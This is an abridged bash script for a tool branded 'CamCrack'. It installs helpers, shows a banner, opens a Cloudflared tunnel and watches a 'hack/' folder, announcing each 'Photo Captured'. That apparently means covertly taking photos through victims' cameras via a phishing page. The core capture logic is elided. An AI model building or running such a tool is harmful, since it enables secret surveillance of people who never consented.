...
pkgs=(php openssh wget figlet pip install lolcat inotify-tools)
for pkg in "${pkgs[@]}"; do
...
# Banner
clear
figlet -f big CamCrack | lolcat
date | lolcat
echo ""
echo -e "${cyan}--------------------------------------------${reset}"
echo -e "${green}  Created by: Tech Information${reset}"
echo -e "${cyan}--------------------------------------------${reset}"
echo -e "${green}  Subscribe: Tech Informationah${reset}"
echo -e "${cyan}--------------------------------------------${reset}"
echo ""
...
if [[ $opt == 2 ]]; then
    ...
    echo -e "${green}[+] Fetching Cloudflared link...${reset}"
    for i in {1..15}; do
...
while true; do
    ...
    if [[ "$new_file" != "$last_file" ]]; then
        echo -e "${green}[+] Photo Captured:${reset} hack/$new_file"
        last_file="$new_file"
    fi
done
